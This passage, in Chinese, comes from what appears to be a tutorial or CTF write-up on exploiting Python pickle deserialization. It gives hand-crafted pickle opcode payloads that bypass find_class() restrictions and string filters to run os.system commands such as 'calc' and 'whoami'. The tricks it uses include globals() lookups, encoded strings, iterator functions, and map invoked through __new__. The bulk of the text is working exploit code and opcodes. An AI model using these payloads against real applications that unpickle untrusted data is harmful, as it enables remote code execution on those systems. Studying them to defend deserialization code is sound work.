opcode=b'\x80\x03(cbuiltins\ngetattr\np0\ncbuiltins\ndict\np1\nX\x03\x00\x00\x00getop2\n0(g2\n(cbuiltins\nglobals\noX\x0C\x00\x00\x00__builtins__op3\n(g0\ng3\nX\x04\x00\x00\x00evalop4\n(g4\nX\x21\x00\x00\x00__import__("os").system("calc")o00.
```
##### 思路二 获取没有被重写的`pickle.loads`函数

构造的payload `builtins.dict.get(builtins.globals(),"pickle").loads()`但是这个思路有个bug,`loads()`函数只能传入`byte`类型的字符串.所以对于v0的opcode必须要引入其他函数来改变字符串类型.这就导致可能不能很好地绕过`find_class()`的重写.好在在v3的opcode中有`B`和`C`操作符可以向栈中压入byte类型的字符串.但是pker不能直接调用操作符.就需要我们自己手搓.

pker的输入

```
funcglob=GLOBAL("builtins","globals")
glob=funcglob()
dict=GLOBAL("builtins","dict")
getattr=GLOBAL("builtins","getattr")
get=getattr(dict,"get")
pickle=get(glob,"pickle")
loads=getattr(pickle,"loads")
loads("bytestr")
```

```
opcode=b"cbuiltins\nglobals\np0\n0g0\n(tRp1\n0cbuiltins\ndict\np2\n0cbuiltins\ngetattr\np3\n0g3\n(g2\nS'get'\ntRp4\n0g4\n(g1\nS'pickle'\ntRp5\n0g3\n(g5\nS'loads'\ntRp6\n0g6\n(S'bytestr'\ntR"
```

这里需要把生成的opcode的`S'bytestr'`改成byte字符串,用了`B`

```
opcode=b"cbuiltins\nglobals\np0\n0g0\n(tRp1\n0cbuiltins\ndict\np2\n0cbuiltins\ngetattr\np3\n0g3\n(g2\nS'get'\ntRp4\n0g4\n(g1\nS'pickle'\ntRp5\n0g3\n(g5\nS'loads'\ntRp6\n0g6\n(B\x0E\x00\x00\x00youropcodehere\ntR"
```

#### 绕过显式字符串检测

`V`操作符可以进行unicode编码
```
Vsecr\u0065t
#secret
```
`S`操作符可以识别十六进制
```
S'\x73ecret'
#secret
```
#### 使用内置函数绕过

涉及到一对概念:可迭代对象(iterable)和迭代器(iterator).最经典的迭代器就是python中的for循环.
```
for i in iterator
    ......
```

在python中有很多可迭代对象

1. **序列类型**：
    - 列表（List）: `[1, 2, 3, 4, 5]`
    - 元组（Tuple）: `(1, 2, 3)`
    - 字符串（String）: `"Hello, World"`
2. **映射类型**：
    - 字典（Dictionary）: `{1: 'One', 2: 'Two'}`
    - 注意：虽然字典本身不是可迭代的（字典迭代实质上是迭代其键，使用 `keys()`、`values()` 或 `items()` 方法可以分别迭代键、值或键值对），但从Python 3.3开始，字典也成为了可迭代对象，迭代时会返回其键。
3. **集合类型**：
    - 集合（Set）: `{1, 2, 3}`
    - frozenset（不可变集合）: `frozenset({1, 2, 3})`
4. **迭代器类型**：
    - 自定义迭代器类（实现了`__iter__()`和`__next__()`方法）
    - 内置迭代器对象，如 `range(5)` 或者通过 `iter()` 函数创建的迭代器
5. **文件对象**：
    - 打开的文本文件或二进制文件，可通过逐行读取进行迭代
6. **生成器表达式**：
    - `(x*x for x in range(5))`
7. 其他内置可迭代对象：
    - enumerate 对象 (`enumerate(list)`)
    - zip 对象 (`zip(list1, list2)`)
    - reversed 对象 (`reversed(list)`)

只要一个对象实现了 `__iter__()` 方法且该方法返回一个迭代器对象，那么这个对象就被认为是可迭代的。在Python中，可以使用 `isinstance(obj, collections.abc.Iterable)` 来检查一个对象是否是可迭代的。

具体的利用参照这个payload

```
next(dir(sys.modules['os']))
 TypeError: 'list' object is not an iterator
#如果直接运行这个的话会抛出一个TypeError: 'list' object is not an iterator
#原因是虽然list是可迭代的,但是他并不是一个迭代器,他并没有__call__函数
>>> next(iter(dir(sys.modules['os'])))
'DirEntry'
#这才是正确的payload
#如果想倒着遍历这个列表的话,可以使用reversed()这个函数
>>> next(reversed(dir(sys.modules['os'])))
'write'
```
直接手搓比用pker舒服多了

```
opcode=b"""(((c__main__
secret
i__builtins__
dir
i__builtins__
reversed
i__builtins__
next
."""
```
只用到了`c`和`i`,遥遥领先

##### 使用类的`__new__()`构造方法绕过

着重注意这个操作符

```
NEWOBJ = b'\x81'#(这个很有用)  #从栈中弹出两次变量,第一次弹出的变量记为var1,第二次弹出的变量记为var2,然后就会通过cls.__new__(var2, *var1)生成实例化对象,然后将生成的对象压栈
```

他是可以触发类的`__new__()`函数的,所以在某些时候可以寻找可用的`__new__()`方法进行绕过.在下一个方法中,我们正是用了这一点才代替`__next__()`方法进行迭代.

##### 使用`map()`,`filter()`函数绕过

两个函数都是python的内置函数.首先来看`map()`和`filter()`是什么

`map(_function_, _iterable_, *_iterables_)`

> 返回一个将 _function_ 应用于 _iterable_ 的每一项，并产生其结果的迭代器。 如果传入了额外的 _iterables_ 参数，则 _function_ 必须接受相同个数的参数并被用于到从所有可迭代对象中并行获取的项。 当有多个可迭代对象时，当最短的可迭代对象耗尽则整个迭代将会停止。

```
filter(_function_, _iterable_)
```

> 使用 _iterable_ 中 _function_ 返回真值的元素构造一个迭代器。 _iterable_ 可以是一个序列，一个支持迭代的容器或者一个迭代器。 如果 _function_ 为 `None`，则会使用标识号函数，也就是说，_iterable_ 中所有具有假值的元素都将被移除。
> 
> 请注意， `filter(function, iterable)` 相当于一个生成器表达式，当 function 不是 `None` 的时候为 `(item for item in iterable if function(item))`；function 是 `None` 的时候为 `(item for item in iterable if item)` 。

注意这两个函数都返回一个迭代器,所以我们需要使用`list()`函数将其变为一个列表输出.

payload
```
map(eval,[__import__("os").system("whoami")])
list(map(eval,['__import__("os").system("whoami")']))
```

`map()`和`filter()`创造的迭代器有一个叫做"懒惰”的特性,也就是需要迭代一次,才能让`func`调用`iterator`里的值.所以我们就需要使用`__next__()`方法对`map()`创建的迭代器进行迭代

参照[AndyNoel](https://xz.aliyun.com/u/51470)师哥的payload:

```
bytes.__new__(bytes, map.__new__(map, eval, ['print(1)']))  # bytes_new->PyBytes_FromObject->_PyBytes_FromIterator->PyIter_Next
tuple.__new__(tuple, map.__new__(map, exec, ["print('1')"]))  # tuple_new_impl->PySequence_Tuple->PyIter_Next
```

这样就可以通过`__new__()`方法对`map()`生成的迭代器进行迭代了.

opcode:

```
opcode=b'''c__builtin__
map
p0
0(S'whoami'
tp1
0(cos
system
g1
tp2
0g0
g2
\x81p3
0c__builtin__
tuple
p4
(g3
t\x81.'''
```

还有
```
opcode=b'''c__builtin__
map
p0
0(S'whoami'
tp1
0(cos
system
g1
tp2
0g0
g2
\x81p3
0c__builtin__
bytes
p4
(g3
t\x81.'''
```